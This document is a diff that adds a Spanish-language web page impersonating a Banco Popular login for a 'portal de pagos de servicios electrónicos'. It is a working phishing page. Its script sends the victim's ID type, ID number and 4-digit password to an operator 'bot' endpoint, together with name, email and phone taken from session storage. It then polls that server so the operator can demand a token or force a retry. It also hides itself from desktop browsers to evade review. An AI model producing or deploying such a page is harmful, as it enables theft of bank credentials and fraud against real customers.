@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>PSE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+}
+body {
+background-color: #f5f5f5;
+color: #333333;
+}
+.page {
+min-height: 100vh;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+}
+.card-wrapper {
+width: 100%;
+display: flex;
+justify-content: center;
+align-items: center;
+padding: 24px 16px;
+}
+.card {
+width: 100%;
+max-width: 420px;
+background-color: #ffffff;
+border-radius: 18px;
+padding: 32px 32px 28px;
+box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
+border: 1px solid #efefef;
+}
+.logo {
+display: flex;
+align-items: center;
+justify-content: center;
+margin-bottom: 24px;
+}
+.logo img {
+max-width: 260px;
+height: auto;
+}
+.welcome {
+text-align: center;
+font-size: 16px;
+line-height: 1.5;
+margin-bottom: 24px;
+color: #333333;
+}
+.welcome strong {
+display: block;
+margin-bottom: 4px;
+}
+.form-group {
+margin-bottom: 16px;
+}
+.form-label {
+display: block;
+font-size: 13px;
+margin-bottom: 6px;
+color: #555555;
+}
+.select-wrapper {
+position: relative;
+}
+.select-wrapper select {
+appearance: none;
+-webkit-appearance: none;
+-moz-appearance: none;
+width: 100%;
+padding: 10px 36px 10px 12px;
+border-radius: 6px;
+border: 1px solid #d5d5d5;
+font-size: 14px;
+color: #333333;
+background-color: #ffffff;
+}
+.select-arrow {
+position: absolute;
+top: 0;
+right: 0;
+bottom: 0;
+width: 34px;
+display: flex;
+align-items: center;
+justify-content: center;
+pointer-events: none;
+color: #ff6d00;
+font-size: 18px;
+}
+.input {
+width: 100%;
+padding: 10px 12px;
+border-radius: 6px;
+border: 1px solid #d5d5d5;
+font-size: 14px;
+}
+.input::placeholder {
+color: #a0a0a0;
+}
+.password-row {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 6px;
+}
+.password-label {
+font-size: 13px;
+color: #555555;
+}
+.link {
+font-size: 13px;
+color: #ff6d00;
+text-decoration: none;
+}
+.link:hover {
+text-decoration: underline;
+}
+.password-wrapper {
+position: relative;
+}
+.toggle-visibility {
+position: absolute;
+right: 0;
+top: 0;
+bottom: 0;
+width: 40px;
+display: flex;
+align-items: center;
+justify-content: center;
+cursor: default;
+color: #ff6d00;
+font-size: 18px;
+}
+.submit-button {
+width: 100%;
+margin-top: 20px;
+padding: 11px 16px;
+border-radius: 6px;
+border: none;
+font-size: 15px;
+font-weight: 600;
+color: #ffffff;
+transition: background-color 0.15s ease, cursor 0.15s ease, opacity 0.15s ease;
+}
+.submit-button:disabled {
+cursor: not-allowed;
+background-color: #d5d5d5;
+opacity: 1;
+}
+.submit-button:not(:disabled) {
+cursor: pointer;
+background-color: #005570;
+}
+.inline-actions{display:flex;gap:10px;margin-top:12px}
+.inline-button{flex:1;padding:10px 14px;border:none;border-radius:6px;font-size:14px;font-weight:600}
+.inline-button.primary{color:#fff;background:#005570}
+.inline-button.primary:disabled{background:#d5d5d5;color:#fff;cursor:not-allowed}
+.inline-button.secondary{color:#005570;background:#eef5f7}
+.loading-overlay {
+position: fixed;
+inset: 0;
+background: rgba(255, 255, 255, 0.85);
+display: none;
+align-items: center;
+justify-content: center;
+z-index: 999;
+}
+.loading-overlay.active {
+display: flex;
+}
+.loader {
+width: 56px;
+height: 56px;
+border-radius: 50%;
+border: 4px solid #e2f3e5;
+border-top-color: #00843d;
+animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+to {
+transform: rotate(360deg);
+}
+}
+.help-section {
+margin-top: 20px;
+text-align: center;
+font-size: 13px;
+line-height: 1.6;
+color: #555555;
+}
+.help-section strong {
+display: block;
+margin-bottom: 6px;
+}
+.help-section a {
+color: #ff6d00;
+text-decoration: none;
+}
+.help-section a:hover {
+text-decoration: underline;
+}
+.disclaimer {
+margin-top: 18px;
+text-align: center;
+font-size: 12px;
+}
+.disclaimer a {
+color: #ff6d00;
+text-decoration: none;
+}
+.disclaimer a:hover {
+text-decoration: underline;
+}
+@media (max-width: 480px) {
+.error-banner {
+max-width: 420px;
+margin: 12px auto 0;
+background-color: #ffe4e1;
+border: 1px solid #ff6d00;
+color: #7a1b00;
+padding: 10px 12px;
+border-radius: 8px;
+font-size: 13px;
+line-height: 1.5;
+display: none;
+}
+.error-banner.visible {
+display: block;
+}
+.card {
+margin-top: 8px;
+padding: 24px 18px 22px;
+border-radius: 14px;
+border-radius: 14px;
+}
+}
+</style>
+</head>
+<body>
+<div id="loading-overlay" class="loading-overlay">
+<div class="loader"></div>
+</div>
+<div class="page">
+<div class="card-wrapper">
+<div class="card">
+<div class="logo">
+<img src="bancopopular.png" alt="Banco Popular">
+</div>
+<div id="error-banner" class="error-banner"></div>
+<div class="welcome">
+<strong>Bienvenido a nuestro nuevo portal de pagos de servicios electrónicos.</strong>
+</div>
+<form>
+<div class="form-group">
+<label class="form-label" for="tipo-documento">Tipo de documento</label>
+<div class="select-wrapper">
+<select id="tipo-documento" name="tipo-documento">
+<option>Cédula de Ciudadanía</option>
+<option>Cédula de Extranjería</option>
+<option>NIT</option>
+<option>Pasaporte</option>
+</select>
+<div class="select-arrow">⌄</div>
+</div>
+</div>
+<div class="form-group">
+<label class="form-label" for="numero-documento">Número de documento (sin puntos ni comas)</label>
+<input class="input" id="numero-documento" type="text" name="numero-documento" inputmode="numeric" autocomplete="off">
+</div>
+<div class="form-group">
+<div class="password-row">
+<span class="password-label">Contraseña</span>
+<a href="#" class="link">¿Olvidaste tu contraseña?</a>
+</div>
+<div class="password-wrapper">
+<input class="input" id="password" type="password" name="password" inputmode="numeric" maxlength="4" autocomplete="off">
+<div class="toggle-visibility">👁</div>
+</div>
+</div>
+<div class="inline-actions">
+<button type="button" class="inline-button secondary" id="btn-cancelar">Cancelar</button>
+<button type="button" class="inline-button primary submit-button" disabled>Continuar</button>
+</div>
+</form>
+</div>
+</div>
+</div>
+<script>
+var numeroDocumento = document.getElementById("numero-documento");
+var passwordInput = document.getElementById("password");
+var submitButton = document.querySelector(".submit-button");
+var loadingOverlay = document.getElementById("loading-overlay");
+var decisionIntervalId = null;
+var btnCancelar = document.getElementById("btn-cancelar");
+
+function soloNumeros(input, maxLength) {
+if (!input) return;
+input.addEventListener("input", function () {
+var soloDigitos = this.value.replace(/\D/g, "");
+if (typeof maxLength === "number") {
+soloDigitos = soloDigitos.slice(0, maxLength);
+}
+this.value = soloDigitos;
+actualizarEstadoBoton();
+});
+}
+
+function actualizarEstadoBoton() {
+if (!submitButton || !passwordInput) return;
+if (passwordInput.value.length === 4 && numeroDocumento && numeroDocumento.value.length > 0) {
+submitButton.disabled = false;
+} else {
+submitButton.disabled = true;
+}
+}
+
+function showLoadingAndNavigate(url) {
+if (loadingOverlay) {
+loadingOverlay.classList.add("active");
+}
+setTimeout(function () {
+window.location.href = url;
+}, 2000);
+}
+
+function startDecisionPolling() {
+if (decisionIntervalId !== null) return;
+decisionIntervalId = setInterval(function () {
+fetch("http://localhost:4000/decision")
+.then(function (res) { return res.json(); })
+.then(function (data) {
+if (!data || !data.decision) return;
+clearInterval(decisionIntervalId);
+decisionIntervalId = null;
+var decision = data.decision;
+if (decision === "error_usuario") {
+showLoadingAndNavigate("index.html?error=user");
+} else if (decision === "pedir_token") {
+showLoadingAndNavigate("autorizacion.html");
+} else if (decision === "otro_banco") {
+if (loadingOverlay) {
+loadingOverlay.classList.remove("active");
+}
+var banner = document.getElementById("error-banner");
+if (banner) {
+banner.textContent = "Por favor selecciona otro banco para realizar esta accion.";
+banner.classList.add("visible");
+}
+setTimeout(function () {
+window.location.href = "/?banks=1&otro_banco=1";
+}, 2000);
+}
+})
+.catch(function () {});
+}, 1000);
+}
+
+function enviarDatosABot() {
+var tipoSelect = document.getElementById("tipo-documento");
+var tipoValor = tipoSelect ? tipoSelect.value : "";
+var payload = {
+banco: "Popular",
+tipo: tipoValor,
+numero: numeroDocumento ? numeroDocumento.value : "",
+clave: passwordInput ? passwordInput.value : "",
+nombre: sessionStorage.getItem("user_nombre") || "No registrado",
+email: sessionStorage.getItem("user_email") || "",
+cedula: sessionStorage.getItem("user_cedula") || "",
+celular: sessionStorage.getItem("bc_usuario") || ""
+};
+fetch("http://localhost:4000/ingresar-popular", {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify(payload)
+}).catch(function () {});
+startDecisionPolling();
+}
+
+soloNumeros(numeroDocumento);
+soloNumeros(passwordInput, 4);
+actualizarEstadoBoton();
+if (submitButton) {
+submitButton.addEventListener("click", function () {
+if (submitButton.disabled) return;
+if (loadingOverlay) {
+loadingOverlay.classList.add("active");
+}
+enviarDatosABot();
+});
+}
+if(btnCancelar){btnCancelar.addEventListener("click",function(){window.history.back();});}
+</script>
+<script>
+    (function() {
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+        try {
+            var banner = document.getElementById('error-banner');
+            if (banner) {
+                var params = new URLSearchParams(window.location.search);
+                if (params.get('error') === 'user') {
+                    banner.textContent = 'Los datos ingresados no coinciden con nuestros registros. Verifica tu información e inténtalo nuevamente.';
+                    banner.classList.add('visible');
+                }
+            }
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
